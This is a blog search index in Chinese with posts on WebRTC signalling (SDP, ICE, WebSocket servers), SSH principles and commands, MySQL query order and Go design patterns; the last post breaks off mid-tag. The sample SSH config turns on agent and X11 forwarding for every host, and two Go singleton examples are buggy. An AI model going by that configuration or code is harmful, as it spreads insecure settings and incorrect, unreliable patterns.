<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>WebRTC 概述</title>
      <link href="/technique/47.html"/>
      <url>/technique/47.html</url>
      
        <content type="html"><![CDATA[<p>WebRTC（Web Real-Time Communication）既是 API 也是协议。WebRTC 协议是两个 WebRTC Agent 协商双向安全实时通信的一组规则，其允许在浏览器和移动应用程序中进行实时音视频通信和数据共享，而无需借助中间服务器。</p><p>WebRTC 的主要功能</p><ul><li>音视频通信：支持高质量的音视频通话，能够适应不同的网络环境。</li><li>数据通道：允许在对等端之间传输任意数据，适用于文件传输、游戏数据同步等场景。</li><li>网络穿透：通过 STUN（Session Traversal Utilities for NAT）和 TURN（Traversal Using Relays around NAT）服务器，WebRTC 可以穿透 NAT 和防火墙，实现对等连接。</li></ul><p>WebRTC 通话建立流程如下图：</p><ul><li>Client A、Client B 都连接信令服务器；</li><li>Client A 创建本地视频，并获取会话描述对象（offer sdp）信息；</li><li>Client A 将 offer sdp 通过信令服务器发送给 Client B；</li><li>Client B 收到信令后，创建本地视频，并获取会话描述对象（answer sdp）信息；</li><li>Client B 将 answer sdp 通过信令服务器发送给 Client A；</li><li>Client A 和 Client B 开始打洞（在两个位于不同私有网络（通常由 NAT设备隔离）的设备之间建立直接通信通道的过程），收集并通过信令服务器交换 ice 信息；</li><li>完成打洞后，Client A 和 Client B 开始为安全的媒体通信协商秘钥；</li><li>至此，Client A 和 Client B 可以进行音视频通话。</li></ul><p><img src="https://github.com/etamsylate-pupu/Image-host/blob/main/blogImg/tech/webrtc_process.png" alt="WebRTC"></p><h2 id="关键步骤"><a href="#关键步骤" class="headerlink" title="关键步骤"></a>关键步骤</h2><h3 id="信令"><a href="#信令" class="headerlink" title="信令"></a>信令</h3><p>信令是 WebRTC 中用于交换控制信息的过程。信令的主要目的是在两个对等端（peer）之间交换必要的信息，以便建立、控制和终止 WebRTC 连接。当 WebRTC Agent 启动时，它不知道与谁通信以及他们将要通信的内容。信令用于解决这个问题，其用于引导呼叫，以便两个 WebRTC Agent 可以开始通信。</p><p>虽然把 WebRTC 称之为点对点的连接，但并不代表在实现过程中不需要服务器的参与。相反，在点对点的信道建立起来之前，二者之间是没有办法通信的。这也就意味着，在信令阶段，需要一个通信服务来帮助Web agent建立起这个连接。</p><p>信令消息的传递不在 WebRTC 的数据通道或媒体流中进行，而是通过独立的通信渠道进行。这些信令消息包括 SDP（Session Description Protocol，会话描述协议）和 ICE（交互式连接建立）候选，用于协商连接参数和网络信息。开发者可以为应用程序引擎选择任意的信息协议（如 SIP 或 XMPP），任意双向通信信道（如 WebSocket 或 XMLHttpRequest） 与持久连接服务器的 API（如Google Channel API）一起工作，而不受限于 WebRTC 的实现，可以直接复用现有的通信基础设施来传递信令消息，而不需要额外的信令服务器。</p><h4 id="会话描述协议（Session-Description-Protocol-SDP）"><a href="#会话描述协议（Session-Description-Protocol-SDP）" class="headerlink" title="会话描述协议（Session Description Protocol, SDP）"></a>会话描述协议（Session Description Protocol, SDP）</h4><p>SDP 是一种格式化的文本，用于描述多媒体会话的参数，如格式、分辨率、编码和加密算法等。对等端通过信令通道交换 SDP 报文，以协商音视频编解码器、媒体格式等。从技术上讲，SDP 并不是一个真正的协议，而是一种数据格式，用于描述在设备之间共享媒体的连接。SDP 由一行或多行 UTF-8 文本组成，每个字段以一个字母开头，后跟一个等号和具体的值。SDP 的字段可以分为会话级字段和媒体级字段。会话级字段描述整个会话的信息，而媒体级字段描述具体的媒体流信息。</p><pre><code>v=0o=- 46117341 2 IN IP4 127.0.0.1s=-t=0 0a=group:BUNDLE audio videoa=msid-semantic: WMS stream1m=audio 9 UDP/TLS/RTP/SAVPF 111 103 104c=IN IP4 0.0.0.0a=rtcp:9 IN IP4 0.0.0.0a=ice-ufrag:abc123a=ice-pwd:xyz456a=ice-options:tricklea=fingerprint:sha-256 12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EFa=setup:actpassa=mid:audioa=sendrecva=rtcp-muxa=rtpmap:111 opus/48000/2a=rtpmap:103 ISAC/16000a=rtpmap:104 ISAC/32000a=ssrc:123456789 cname:stream1m=video 9 UDP/TLS/RTP/SAVPF 96 97 98c=IN IP4 0.0.0.0a=rtcp:9 IN IP4 0.0.0.0a=ice-ufrag:abc123a=ice-pwd:xyz456a=ice-options:tricklea=fingerprint:sha-256 12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EFa=setup:actpassa=mid:videoa=sendrecva=rtcp-muxa=rtpmap:96 VP8/90000a=rtpmap:97 rtx/90000a=fmtp:97 apt=96a=rtpmap:98 VP9/90000a=ssrc:987654321 cname:stream1</code></pre><h4 id="交互式连接建立（Interactive-Connectivity-Establishment，ICE）"><a href="#交互式连接建立（Interactive-Connectivity-Establishment，ICE）" class="headerlink" title="交互式连接建立（Interactive Connectivity Establishment，ICE）"></a>交互式连接建立（Interactive Connectivity Establishment，ICE）</h4><p>ICE 通过收集和交换候选地址（candidates），找到最佳的网络路径，以实现对等端之间的直接通信。ICE 主要解决 NAT（网络地址转换）和防火墙穿透问题，使得对等端能够在复杂的网络环境中建立连接。ICE可以分为以下几个步骤：</p><ul><li>收集候选地址：每个对等端收集自身的候选地址，包括主机候选（Host Candidate）、反射候选（Server Reflexive Candidate）和中继候选（Relay Candidate）。</li><li>交换候选地址：对等端通过信令通道交换候选地址。</li><li>连接检查：对等端使用 STUN协议进行连接检查，测试候选地址的可达性。</li><li>选择最佳路径：根据连接检查的结果，选择最佳的候选地址对，建立连接。</li></ul><blockquote><p>STUN（Session Traversal Utilities for NAT）服务器：用于获取对等端的公共 IP 地址和端口，帮助穿透 NAT。<br>TURN（Traversal Using Relays around NAT）服务器：用于在复杂网络环境中进行中继通信，当直接连接无法建立时，TURN 服务器充当中继节点。</p></blockquote><p>候选地址类型包括：</p><ul><li>主机候选（Host Candidate）：本地网络接口的 IP 地址和端口。</li><li>反射候选（Server Reflexive Candidate）：通过 STUN 服务器获取的公共 IP 地址和端口，用于穿透 NAT。</li><li>中继候选（Relay Candidate）：通过 TURN 服务器获取的中继地址，用于在复杂网络环境中进行中继通信。</li></ul><h4 id="信令过程示例（使用WebSocket进行信令）"><a href="#信令过程示例（使用WebSocket进行信令）" class="headerlink" title="信令过程示例（使用WebSocket进行信令）"></a>信令过程示例（使用WebSocket进行信令）</h4><blockquote><p>WebSocket是一种在单个TCP连接上进行全双工通信的协议。在 WebSocket 中，浏览器和服务器只需要完成一次握手，两者之间就直接可以创建持久性的连接，并进行双向数据传输。</p></blockquote><p><strong>服务器端</strong></p><p>首先，需要一个 WebSocket 服务器来中继信令消息。</p><ul><li>使用Node.js和ws库<br>&#96;&#96;&#96;<br>const WebSocket &#x3D; require(‘ws’);<br>const wss &#x3D; new WebSocket.Server({ port: 8080 });</li></ul><p>wss.on(‘connection’, (ws) &#x3D;&gt; {<br>  ws.on(‘message’, (message) &#x3D;&gt; {<br>    &#x2F;&#x2F; 广播消息给所有连接的客户端<br>    wss.clients.forEach((client) &#x3D;&gt; {<br>      if (client !&#x3D;&#x3D; ws &amp;&amp; client.readyState &#x3D;&#x3D;&#x3D; WebSocket.OPEN) {<br>        client.send(message);<br>      }<br>    });<br>  });<br>});</p><p>console.log(‘WebSocket server is running on ws:&#x2F;&#x2F;localhost:8080’);</p><pre><code>- 使用Go 和 gorilla/websocket 库</code></pre><p>package main</p><p>import (<br>    “log”<br>    “net&#x2F;http”<br>    “github.com&#x2F;gorilla&#x2F;websocket”<br>)</p><p>&#x2F;&#x2F; 存储所有连接的客户端<br>var clients &#x3D; make(map[*websocket.Conn]bool)</p><p>&#x2F;&#x2F; 广播通道，用于将消息发送给所有客户端<br>var broadcast &#x3D; make(chan Message)</p><p>&#x2F;&#x2F; 升级器，用于将 HTTP 连接升级为 WebSocket 连接<br>var upgrader &#x3D; websocket.Upgrader{}</p><p>&#x2F;&#x2F; Message 结构体，用于表示从客户端接收到的消息<br>type Message struct {<br>    Data string <code>json:&quot;data&quot;</code><br>}</p><p>func main() {<br>    &#x2F;&#x2F; 设置 WebSocket 连接的处理函数<br>    http.HandleFunc(“&#x2F;ws”, handleConnections)</p><pre><code>// 启动一个 goroutine 来处理广播消息go handleMessages()// 启动 HTTP 服务器，监听端口 8080log.Println(&quot;WebSocket server is running on ws://localhost:8080&quot;)log.Fatal(http.ListenAndServe(&quot;:8080&quot;, nil))</code></pre><p>}</p><p>&#x2F;&#x2F; 处理 WebSocket 连接的函数<br>func handleConnections(w http.ResponseWriter, r *http.Request) {<br>    &#x2F;&#x2F; 将 HTTP 连接升级为 WebSocket 连接<br>    ws, err :&#x3D; upgrader.Upgrade(w, r, nil)<br>    if err !&#x3D; nil {<br>        log.Fatal(err)<br>    }<br>    &#x2F;&#x2F; 确保在函数结束时关闭 WebSocket 连接<br>    defer ws.Close()</p><pre><code>// 将新的 WebSocket 连接添加到客户端列表clients[ws] = true// 不断读取来自客户端的消息for &#123;    var msg Message    // 读取 JSON 格式的消息    err := ws.ReadJSON(&amp;msg)    if err != nil &#123;        log.Printf(&quot;error: %v&quot;, err)        // 如果读取消息时出错，将客户端从列表中删除        delete(clients, ws)        break    &#125;    // 将消息发送到广播通道    broadcast &lt;- msg&#125;</code></pre><p>}</p><p>&#x2F;&#x2F; 处理广播消息的函数<br>func handleMessages() {<br>    for {<br>        &#x2F;&#x2F; 从广播通道中读取消息<br>        msg :&#x3D; &lt;-broadcast<br>        &#x2F;&#x2F; 将消息发送给所有连接的客户端<br>        for client :&#x3D; range clients {<br>            err :&#x3D; client.WriteJSON(msg)<br>            if err !&#x3D; nil {<br>                log.Printf(“error: %v”, err)<br>                &#x2F;&#x2F; 如果发送消息时出错，关闭连接并将客户端从列表中删除<br>                client.Close()<br>                delete(clients, client)<br>            }<br>        }<br>    }<br>}</p><pre><code>**客户端**在客户端，需要实现 WebRTC 的信令逻辑，包括创建 RTCPeerConnection、处理 ICE 候选、交换 SDP 等。参考资料[WebRTC协议](https://developer.mozilla.org/zh-CN/docs/Web/API/WebRTC_API/Protocols)[写给好奇者的WebRTC](https://webrtcforthecurious.com/zh/docs/)[前端WebRTC实战](https://zhuanlan.zhihu.com/p/59520779)[WebRTC Code Samples](https://github.com/webrtc/samples)[WebRTC Samples](https://webrtc.github.io/samples/)</code></pre>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webrtc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH原理与配置</title>
      <link href="/technique/47.html"/>
      <url>/technique/47.html</url>
      
        <content type="html"><![CDATA[<h3 id="什么是SSH？"><a href="#什么是SSH？" class="headerlink" title="什么是SSH？"></a>什么是SSH？</h3><p>SSH（Secure Shell）是一种用于在不安全的网络上安全地访问远程计算机的协议。它提供了强大的身份验证和加密功能，确保数据在传输过程中不被窃听、篡改或伪造。SSH 广泛用于远程登录、命令执行、文件传输和端口转发等场景。</p><h3 id="为什么需要SSH？"><a href="#为什么需要SSH？" class="headerlink" title="为什么需要SSH？"></a>为什么需要SSH？</h3><p>首先思考为什么需要 SSH？</p><p>传统的明文数据传输，内容容易被截获。在通信中出于保护数据安全的目的，一般的技术方案是对数据进行加密，常见的加密算法根据不同的密钥管理方式分为对称加密和非对称加密，前者加解密密钥相同，后者分为公钥和私钥。</p><p>对称加密的流程为：</p><ul><li>密钥生成：生成一个对称密钥</li><li>加密：发送方使用对称密钥对明文数据进行加密，生成密文</li><li>传输：将密文传输给接收方</li><li>解密：接收方使用相同的对称密钥对密文解密，恢复出明文数据</li></ul><p>对称加密由于加解和解密使用的是同一个密钥算法，故而在加解密的过程中速度比较快，适合于数据量比较大的加解密。对称加密的主要有优点就是算法公开、计算量小、加密速度快、加密效率高；但是它也存在强大的缺点，缺点就是密钥协商过程中，一旦密钥泄露，别人可以获取到密钥，这样也能对密文进行解密。另外，每对用户每次使用对称加密算法时，都需要使用其他人不知道的独一密钥，这会使得收、发双方所拥有的钥匙数量巨大，密钥管理成为双方的负担。常见的对称加密算法有：DES（Data Encryption Standard）、AES（Advanced Encryption Standard）、3DES（Triple DES）、Blowfish 和 RC2等。</p><p>非对称加密的流程为：</p><ul><li>密钥生成：生成一对密钥，公钥和私钥</li><li>公钥分发：将公钥发给通信方</li><li>加密：发送方使用接收方的公钥对明文数据进行加密，生成密文</li><li>传输：将密文传输给接收方</li><li>解密：接收方使用自己的私钥对密文进行解密，恢复出明文数据</li></ul><p>非对称加密的特征是算法强度复杂、安全性依赖于算法与密钥但是由于其算法复杂，而使得加密解密速度没有对称加密解密的速度快。其密钥管理相对简单，提供了数字签名（私钥加密公钥解密）和身份认证功能，确保数据的完整性和真实性。常见的非对称加密算法有：RSA（Rivest-Shamir-Adleman）、ECC（Elliptic Curve Cryptography）和 DSA（Digital Signature Algorithm）等。</p><p>经过上述分析，如果使用对称密码算法，发送方和接收方如何协商会话密钥是一个棘手的问题，密钥一旦被泄露那么整个会话就不再安全。如果使用非对称密码算法，可以避免密钥管理困难性，但是接收方公钥的真实性无法保证，因为攻击者可以进行中途拦截，将公钥替换为自己的公钥，这样会话数据就能被轻松获取，这就是所谓的中间人攻击。</p><p>那么关键点就在于确认接收方公钥的真实性。</p><p>在HTTPS的TLS&#x2F;SSL握手中，客户端通过CA签发的数字证书来认证服务端公钥真实性，因为CA是受信任的第三方机构，其通过严格的信任链机制来确保证书的合法性和安全性。并且考虑到密码算法效率，非对称密码算法用于密钥交换，对称密码算法用于数据信息加密。</p><p>SSH和SSL都是网络安全协议，通过加密和认证提升两台设备间传输数据的安全性。但SSH和SSL的生效方式和服务目标存在差异。SSH在两台设备间创建安全隧道，使这两台设备间可以安全地发送命令、传输数据等。例如，客户端通过SSH远程登录到一台服务器上，就可以安全地远程管理这台服务器，在服务器上执行想要的命令。SSL则是使用SSL证书保证两台设备间安全地传输数据，而不是像SSH那样可以执行命令。例如，用户通过浏览器访问某安装了SSL证书且启用了HTTPS的服务器，浏览器和服务器之间可以安全地传输数据。</p><h3 id="SSH工作流程"><a href="#SSH工作流程" class="headerlink" title="SSH工作流程"></a>SSH工作流程</h3><p>为建立安全的SSH通道，SSH服务端和客户端需要先建立TCP连接，然后协商使用的版本号和各类算法，生成会话密钥用于后续的对称加密，在完成用户认证后，双方即可建立会话进行数据交互，工作流程如下：</p><ul><li>TCP连接建立：SSH服务器在指定端口监听连接请求，客户端向对应端口发起连接请求后，双方进行TCP三次握手</li><li>版本协商：SSH服务器和客户端通过协商确定最终使用的SSH版本号。具体的，服务器通过建立的TCP连接向客户端发送支持的SSH版本信息；客户端收到后根据自身支持的SSH版本决定使用的版本号，并将版本号发送给服务器，服务器判断自身是否支持，确定版本协商是否成功。</li><li>算法协商：服务器和客户端分别向对方发送自己支持的密码学套件，协商使用的算法。</li><li>密钥交换：客户端和服务器根据协商好的密钥交换算法进行密钥交换</li><li>用户认证：客户端向服务器发送用户认证请求，服务器验证用户身份</li><li>会话请求：认证通过后，客户端向服务器发送会话请求，请求服务器提供某种类型的服务，服务器根据请求进行回应</li><li>会话交互：会话建立后，服务器和客户端在该会话上进行数据信息的交互，发送的数据由会话密钥进行加密。</li></ul><p>SSH客户端向SSH服务器发起认证请求，SSH服务器对SSH客户端进行认证，有几种常见的认证方法：基于口令的认证、基于密钥的认证以及基于Kerberos的认证。</p><ul><li>基于口令的认证：客户端通过用户名和密码的方式进行认证，加密后的用户名和密码发送给服务器，服务器解密后与本地保存的用户名和密码进行比对，并向客户端返回认证成功或失败的消息。这种认证方式比较简单，每次登录都需要输入用户名和密码。</li><li>基于密钥的认证：客户端使用自己的私钥对消息进行签名，服务器使用客户端公钥验证签名。和SSL不同，SSH客户端生成的公钥对无法通过CA公证，需要客户端手动将公钥添加至服务器的authorized key中。<ul><li>服务器收到认证请求后，会生成随机数R，并使用客户端公钥加密R，并将加密信息发送给客户端；</li><li>客户端收到加密信息后，使用私钥解密获得R，客户端使用哈希算法对随机数R和会话密钥生成摘要Digest1，发送给服务器；</li><li>服务器对R和会话密钥使用相同的哈希算法生成摘要Digest2，比较Digest1和Digest2，如果相同则完成认证过程。</li></ul></li><li>基于Kerberos的认证：客户端从Kerberos认证服务器获取票据，使用该票据向服务器请求访问，服务器认证票据的有效性。</li></ul><h3 id="SSH实践"><a href="#SSH实践" class="headerlink" title="SSH实践"></a>SSH实践</h3><h4 id="常用命令及配置"><a href="#常用命令及配置" class="headerlink" title="常用命令及配置"></a>常用命令及配置</h4><p>1、连接到远程服务器</p><pre><code>ssh username@hostnamessh -p port_number username@hostname</code></pre><p>2、生成SSH密钥对</p><pre><code>ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -C &#39;user@example.com&#39;</code></pre><p>各参数含义如下：</p><ul><li>-t：指定密钥类型</li><li>-b：指定密钥长度</li><li>-f：指定密钥文件的保存路径</li><li>-C：添加注释，用户标识密钥的用途或所有者</li></ul><p>不指定路径时，密钥默认保存在~&#x2F;.ssh目录下，常见的密钥文件包括：</p><ul><li>id_rsa 和 id_rsa.pub：RSA 密钥对</li><li>id_ecdsa 和 id_ecdsa.pub：ECDSA 密钥对</li><li>id_ed25519 和 id_ed25519.pub：Ed25519 密钥对</li></ul><p>3、将公钥复制到远程服务器</p><p>将 ~&#x2F;.ssh&#x2F;id_rsa.pub 复制到远程服务器的 ~&#x2F;.ssh&#x2F;authorized_keys 文件中</p><pre><code>ssh-copy-id username@hostname</code></pre><p>4、指定特定的私钥文件</p><pre><code>ssh -i /path/to/private_key username@hostname</code></pre><p>5、启动ssh-agent</p><p>ssh-agent 是一个用于管理 SSH 私钥的代理程序。通过使用 SSH 代理，用户可以在会话期间缓存私钥的解密信息，避免频繁输入密码短语。使用不同的密钥连接到不同的主机时，需要要手动指定对应的密钥，而ssh代理可以自动帮助我们选择对应的密钥进行认证。（注意：ssh-agent，就要求repo使用的协议是ssh，而不是http）</p><p>运行 ssh agent 以后，会加载默认的私钥。如果有多个密钥，则需要在 ~&#x2F;.ssh&#x2F;config 中进行配置。</p><pre><code>ssh-agent $SHELLeval  &#39;$(ssh-agent -s)&#39;</code></pre><p>6、添加私钥到ssh-agent</p><p>ssh-add 用于手动将私钥添加到 ssh-agent 中。</p><pre><code>ssh-add ~/.ssh/id_rsa</code></pre><p>7、从远程主机获取公钥</p><pre><code>ssh-keyscan -p port_number -t type -f file hostname</code></pre><p>各参数含义如下：</p><ul><li>-p port：指定 SSH 服务器的端口号（默认是 22）。</li><li>-t type：指定要获取的密钥类型（如 rsa、dsa、ecdsa、ed25519）。</li><li>-f file：从文件中读取主机列表进行扫描。</li></ul><p>8、为不同主机设置特定选项</p><p>客户端配置文件为~&#x2F;.ssh&#x2F;config，实例配置如下：</p><pre><code># 全局配置Host *    ForwardAgent yes    ForwardX11 yes    ServerAliveInterval 60# 针对特定主机的配置Host myserver    HostName example.com    User myuser    Port 2222    IdentityFile ~/.ssh/id_rsa    Compression yesHost another_server    HostName another.example.com    User anotheruser    IdentityFile ~/.ssh/id_ed25519</code></pre><p>常用配置选项：</p><ul><li>Host：定义主机别名或通配符（如 * 表示所有主机）。</li><li>HostName：实际的主机名或 IP 地址。</li><li>User：默认的用户名。</li><li>Port：SSH 服务器的端口号。</li><li>IdentityFile：用于认证的私钥文件。</li><li>ForwardAgent：是否启用代理转发。</li><li>ForwardX11：是否启用 X11 转发。</li><li>ServerAliveInterval：发送保持活跃消息的间隔时间（以秒为单位）。</li><li>Compression：是否启用数据压缩。</li></ul><p>9、保存已知的远程主机公钥信息</p><p>用于防止中间人攻击。当客户端首次连接到一个新的 SSH 服务器时，服务器会提供其公钥，会提示用户确认并将其公钥添加到已知主机文件中。以后每次连接到该主机时，客户端会检查 known_hosts 文件中存储的公钥信息，以验证远程主机的身份。如果公钥匹配，连接继续；如果不匹配，客户端会发出警告，提示可能存在安全风险。</p><p>know_hosts文件中的每一行包含一个已知主机的公钥信息，格式为：</p><pre><code>hostname,ip_address key_type key</code></pre><p>也可以手动添加公钥至know_host文件，例如使用ssh-keyscan命令</p><pre><code>ssh-keyscan example.com &gt;&gt; ~/.ssh/known_hosts</code></pre><p>10、测试连接是否正常</p><pre><code>ssh -T git@hostname</code></pre><h4 id="SSH寻找私钥流程"><a href="#SSH寻找私钥流程" class="headerlink" title="SSH寻找私钥流程"></a>SSH寻找私钥流程</h4><p>1、根据命令行参数指定的私钥文件</p><p>如果使用了-i选项指定了私钥文件，那么客户端会根据该文件进行身份认证</p><p>2、检查SSH配置文件</p><p>如果在命令行参数没有指定私钥文件，客户端会检查配置文件 ~&#x2F;.ssh&#x2F;config，获取对应主机使用的私钥</p><p>3、使用默认私钥文件</p><p>如果没有在命令行参数、配置文件中指定私钥文件，SSH 客户端会尝试使用默认的私钥文件。这些文件通常位于用户的 ~&#x2F;.ssh&#x2F; 目录下，获取默认公私钥文件。</p><ul><li>~&#x2F;.ssh&#x2F;id_rsa：RSA 私钥</li><li>~&#x2F;.ssh&#x2F;id_dsa：DSA 私钥</li><li>~&#x2F;.ssh&#x2F;id_ecdsa：ECDSA 私钥</li><li>~&#x2F;.ssh&#x2F;id_ed25519：Ed25519 私钥</li></ul><p>4、询问SSH代理</p><p>如果没有找到合适的私钥文件，SSH 客户端会询问正在运行的 SSH 代理（ssh-agent）是否有可用的私钥。</p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>慢SQL优化</title>
      <link href="/technique/45.html"/>
      <url>/technique/45.html</url>
      
        <content type="html"><![CDATA[<h2 id="MYSQL执行过程及执行顺序"><a href="#MYSQL执行过程及执行顺序" class="headerlink" title="MYSQL执行过程及执行顺序"></a>MYSQL执行过程及执行顺序</h2><h2 id="MYSQL查询语句执行顺序"><a href="#MYSQL查询语句执行顺序" class="headerlink" title="MYSQL查询语句执行顺序"></a>MYSQL查询语句执行顺序</h2><p>所有的查询语句都是从FROM开始执行，在执行过程中，每个步骤都会生成一个虚拟表，这个虚拟表将作为下一个执行步骤的输入，最后一个步骤产生的虚拟表即为输出结果。</p><pre><code>(9) SELECT (10) DISTINCT &lt;column&gt;,(6) AGG_FUNC &lt;column&gt; or &lt;expression&gt;, ...(1) FROM &lt;left_table&gt;     (3) &lt;join_type&gt;JOIN&lt;right_table&gt;    (2) ON&lt;join_condition&gt;(4) WHERE &lt;where_condition&gt;(5) GROUP BY &lt;group_by_list&gt;(7) WITH &#123;CUBE|ROLLUP&#125;(8) HAVING &lt;having_condtion&gt;(11) ORDER BY &lt;order_by_list&gt;(12) LIMIT &lt;limit_number&gt;;</code></pre><p>各关键字说明如下：</p><ul><li>FROM：从指定表选择数据</li><li>ON：指定连接条件</li><li>JOIN：指定要连接的表，通过 FROM 和 JOIN ON 选择需要执行的数据库表 T 和 S，产生笛卡尔积，生成 T 和 S 合并的临时中间表 Temp1，通过 ON 产生临时中间表 Temp2</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式</title>
      <link href="/technique/46.html"/>
      <url>/technique/46.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>软件设计模式(Design Pattern)是一套被反复使用、多数人知晓的、经过分类编目的、代码设计经验的总结，使用设计模式是为了可重用代码、让代码更容易被他人理解并且保证代码可靠性。</p></blockquote><p>设计模式目前包括： GoF提出的23种设计模式  + “简单工厂模式” ，可以分为以下几类</p><ul><li>创建型(Creational)模式：如何创建对象；</li><li>结构型(Structural)模式：如何实现类或对象的组合；</li><li>行为型(Behavioral)模式：类或对象怎样交互以及怎样分配职责。</li></ul><p>面向对象的设计原则（Object-Oriented Design Principles）是指导开发人员如何设计和编写高质量、可维护、可扩展的软件的基本准则。这些原则帮助开发人员创建灵活、可重用的代码，并减少代码的复杂性和耦合度。以下是一些重要的面向对象设计原则</p><ul><li>单一职责原则（Single Responsibility Principle, SRP）：类的职责单一，对外只提供一种功能，而引起类变化的原因都应该只有一个。</li><li>开闭原则（Open&#x2F;Closed Principle, OCP）：软件实体（类、模块、函数等）应该对扩展开放，对修改关闭。（类的改动是通过增加代码进行的，而不是修改源代码。）</li><li>里氏替换原则（Liskov Substitution Principle, LSP）：子类对象必须能够替换父类对象，并且程序的行为不会发生变化。任何抽象类（interface接口）出现的地方都可以用他的实现类进行替换，实际就是虚拟机制，语言级别实现面向对象功能。</li><li>依赖倒转原则（Dependence  Inversion Principle, DIP）：高层模块不应该依赖于低层模块，二者都应该依赖于抽象（接口）；抽象不应该依赖于细节，细节应该依赖于抽象。换句话说，是针对接口编程。</li><li>接口隔离原则（Interface Segregation Principle, ISP）：不应该强迫用户的程序依赖他们不需要的接口方法。一个接口应该只提供一种对外功能，不应该把所有操作都封装到一个接口中去。</li><li>合成复用原则（Composite Reuse Principle, CRP）：尽量使用对象组合，而不是继承来达到复用的目的。如果使用继承，会导致父类的任何变换都可能影响到子类的行为。如果使用对象组合，就降低了这种依赖关系。</li><li>迪米特法则（Law of Demeter, LoD）：一个对象应当对其他对象尽可能少的了解，从而降低各个对象之间的耦合，提高系统的可维护性。</li></ul><blockquote><p>因为Golang不提供继承机制，需要使用匿名组合模拟实现继承。此处需要注意：因为父类需要调用子类方法，所以子类需要匿名组合父类的同时，父类需要持有子类的引用。</p></blockquote><h2 id="创建型模式"><a href="#创建型模式" class="headerlink" title="创建型模式"></a>创建型模式</h2><h3 id="单例模式（Singleton）"><a href="#单例模式（Singleton）" class="headerlink" title="单例模式（Singleton）"></a>单例模式（Singleton）</h3><p>确保一个类仅有一个实例，并提供一个访问它的全局访问。</p><p>实现单例模式的步骤为：</p><ul><li>类私有化：外部不能通过这个类直接创建一个对象</li><li>提供一个全局访问点：对外提供一个方法来获取这个唯一实例对象</li><li>确保线程安全：在并发环境下，确保实例的创建是线程安全的</li></ul><p>单例模式分为饿汉式和懒汉式，前者在初始化单例唯一指针的时候，就已经提前开辟好了一个对象，申请了内存；后者在第一次使用时才创建实例。饿汉式的好处是，不会出现线程并发创建，导致多个单例的出现，但是缺点是如果这个单例对象在业务逻辑没有被使用，也会客观的创建一块内存对象。懒汉式的好处是延迟实例化，节省资源，但需要处理多线程环境下的同步问题。</p><ul><li>懒汉式</li></ul><p>1、非线程安全实现方式</p><pre><code>// 私有类，首字母名称小写type singleton struct&#123;&#125;// 指针指向这个唯一对象，golang没有长指针概念，则将指针私有化不让外部模块访问var instance *singleton// 对外提供方法或者这个唯一实例对象func GetInstanceLazyUnsafe() *singleton &#123;    //首次调用才生成单例的实例，非线程安全    if instance == nil &#123;        instance = new(singleton)        return instance    &#125;    return instance&#125;</code></pre><p>2、使用互斥锁</p><pre><code>// 私有类，首字母名称小写type singleton struct&#123;&#125;// 指针指向这个唯一对象，golang没有长指针概念，则将指针私有化不让外部模块访问var instance *singleton// 锁var lock sync.Mutexfunc GetInstanceLazyMutex() *singleton &#123;    //为了线程安全，增加互斥锁，性能较低    lock.Lock()    defer lock.Unlock()    if instance == nil &#123;        return new(singleton)    &#125;     return instance&#125;</code></pre><p>3、使用原子操作检查状态</p><pre><code>// 私有类，首字母名称小写type singleton struct&#123;&#125;// 指针指向这个唯一对象，golang没有长指针概念，则将指针私有化不让外部模块访问var instance *singleton// 标记var initialized uint32// 锁var mulock sync.Mutexfunc GetInstanceLazyAtomic() *singleton&#123;    // 借助原子操作，若已标记，即已实例化，直接返回    if atomic.LoadUint32(&amp;initialized) == 1&#123;        return instance    &#125;    // 否则加锁申请    mulock.Lock()    defer mulock.Unlock()    if initialized == 0&#123;        instance  = new(singleton)        // 设置标记位        atomic.StoreUint32(&amp;initialized,1)    &#125;    return instance&#125;</code></pre><p>4、使用sync.once包</p><pre><code>// 私有类，首字母名称小写type singleton struct&#123;&#125;// 指针指向这个唯一对象，golang没有长指针概念，则将指针私有化不让外部模块访问var instance *singleton// 使用golang oncevar once sync.Oncefunc GetInstanceLazyOnce() *singleton&#123;    once.Do(func ()  &#123;        instance = new(singleton)    &#125;)    return instance&#125;</code></pre><ul><li>饿汉式</li></ul><pre><code>// 私有类，首字母名称小写type singleton struct&#123;&#125;// 包加载时创建var instanceEager *singleton = new(singleton)func GetInstanceEager()*singleton&#123;    return instance&#125;</code></pre><p>单例模式优点</p><ul><li>在单例模式中，活动的单例只有一个实例，对单例类的所有实例化得到的都是相同的一个实例。这样就 防止其它对象对自己的实例化，确保所有的对象都访问一个实例</li><li>单例模式具有一定的伸缩性，类自己来控制实例化进程，类就在改变实例化进程上有相应的伸缩性。</li><li>提供了对唯一实例的受控访问</li><li>由于在系统内存中只存在一个对象，因此可以节约系统资源，当需要频繁创建和销毁的对象时单例模式无疑可以提高系统的性能</li><li>允许可变数目的实例</li><li>避免对共享资源的多重占用</li></ul><p>单例模式的缺点</p><ul><li>不适用于变化的对象，如果同一类型的对象总是要在不同的用例场景发生变化，单例就会引起数据的错误，不能保存彼此的状态</li><li>由于单例模式中没有抽象层，因此单例类的扩展有很大的困难</li><li>单例类的职责过重，在一定程度上违背了“单一职责原则”。</li><li>滥用单例将带来一些负面问题，如为了节省资源将数据库连接池对象设计为的单例类，可能会导致共享连接池对象的程序过多而出现连接池溢出；如果实例化的对象长时间不被利用，系统会认为是垃圾而被回收，这将导致对象状态的丢失。</li></ul><p>单例模式的使用场景</p><ul><li>需要频繁实例化然后销毁的对象。</li><li>创建对象时耗时过多或者耗资源过多，但又经常用到的对象。</li><li>有状态的工具类对象。</li><li>频繁访问数据库或文件的对象。</li></ul><h3 id="简单工厂模式（Simple-Factory）"><a href="#简单工厂模式（Simple-Factory）" 